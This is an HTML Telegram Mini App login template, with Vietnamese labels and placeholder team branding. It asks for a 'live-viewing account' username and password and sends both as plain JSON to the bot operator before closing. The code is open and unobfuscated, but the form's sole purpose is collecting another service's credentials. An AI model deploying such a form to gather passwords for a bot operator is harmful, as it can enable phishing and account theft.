<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Giao Diện Đăng Nhập</title>
    <!-- THƯ VIỆN BẮT BUỘC CỦA TELEGRAM -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        body {
            background-color: #1a1a2e; /* Màu nền tối */
            color: white;
            font-family: Arial, sans-serif;
            padding: 20px;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background-color: #16213e;
            padding: 20px;
            border-radius: 15px;
            box-sizing: border-box;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
            color: #e94560;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #a9a9a9;
            font-size: 14px;
            font-weight: bold;
        }
        .input-group input {
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #303a52;
            background-color: #0f172a;
            color: white;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #00a8ff;
        }
        .btn-submit {
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background: linear-gradient(90deg, #0f4c75, #3282b8);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-submit:active {
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h3>▶ TÊN TEAM CỦA BẠN</h3>
        </div>

        <div class="input-group">
            <label>👤 TÊN TÀI KHOẢN XEM LIVE</label>
            <input type="text" id="username" placeholder="Nhập username">
        </div>

        <div class="input-group">
            <label>🔑 MẬT KHẨU</label>
            <input type="password" id="password" placeholder="Nhập password">
        </div>

        <button class="btn-submit" id="btnSubmit">XÁC NHẬN ĐĂNG NHẬP</button>
    </div>

    <script>
        // Báo cho Telegram biết Mini App đã sẵn sàng và mở full màn hình
        let tg = window.Telegram.WebApp;
        tg.expand(); 

        // Lắng nghe sự kiện người dùng bấm nút Xác Nhận
        document.getElementById('btnSubmit').addEventListener('click', function() {
            // Lấy giá trị trong ô nhập liệu
            let u = document.getElementById('username').value;
            let p = document.getElementById('password').value;

            // Nếu bỏ trống thì cảnh báo
            if (!u || !p) {
                tg.showAlert("Vui lòng nhập đầy đủ Tài khoản và Mật khẩu!");
                return;
            }

            // Gói dữ liệu lại thành chuỗi JSON
            let data = JSON.stringify({
                taikhoan: u,
                matkhau: p
            });

            // Gửi dữ liệu về Bot và đóng Web App
            tg.sendData(data);
            tg.close();
        });
    </script>
</body>
</html>
